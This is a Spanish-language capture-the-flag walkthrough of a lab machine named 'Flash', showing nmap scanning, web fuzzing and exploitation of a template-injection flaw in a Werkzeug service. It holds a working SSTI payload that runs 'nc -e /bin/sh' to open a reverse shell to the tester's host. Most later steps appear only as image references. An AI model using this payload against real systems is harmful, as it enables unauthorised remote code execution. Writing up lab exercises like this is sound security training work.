# Máquina Flash

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.158

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80,8080 -vvv -Pn 192.168.5.158

![alt text](image-2.png)

### Fuzzing web

feroxbuster --url http://192.168.5.158/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

No se encontró nada interesante.


### Explotación

La versión Werkzeug httpd 2.3.4 es vulnerable a SSTI

buscamos el parámetro vulnerable:

![alt text](image-3.png)


ahora ejecutamos:

Abrir un RCE:

{{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/sh 192.168.5.131 443').read()}}

![alt text](image-4.png)

me puse en escucha con netcat previamente por el puerto 443:

![alt text](image-5.png)

al analizar el archivo /etc/nginx/sites-available/default, encontré dominio

![alt text](image-6.png)

lo agregué al /etc/hosts

![alt text](image-7.png)

luego visualicé que en /var/www/html tengo permisos de escritura e hice:

![alt text](image-8.png)

en la probé web

![alt text](image-9.png)

luego ejecuté en la url:

![alt text](image-10.png)

me puse en escucha en netcat por el puerto 4444

![alt text](image-11.png)

### Escalar privilegios

siendo el usuario www-data

![alt text](image-12.png)

### user.txt

![alt text](image-13.png)

### root.txt

![alt text](image-14.png)